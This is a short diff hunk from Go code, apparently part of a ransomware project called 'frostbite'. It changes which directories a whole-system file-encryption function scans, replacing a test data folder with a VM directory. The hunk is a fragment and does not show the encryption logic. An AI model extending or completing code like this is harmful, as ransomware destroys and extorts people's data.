@@ -30,7 +30,7 @@ func WholeSystemEncrypt(aesKey []byte, encryptedAesKey []byte) {
 	timeNow := time.Now()
 
 	dirsToScan = generateListOfDirsToScan(dirsToScan, dirsToRemove)
-	// dirsToScan = []string{"/home/dejan/dev/go/malware/frostbite/data"}
+	dirsToScan = []string{"/run/media/dejan/AMD/vm/"}
 	pl("dirsToScan: ", dirsToScan)
 
 	runtime.GOMAXPROCS(runtime.NumCPU() / 2)
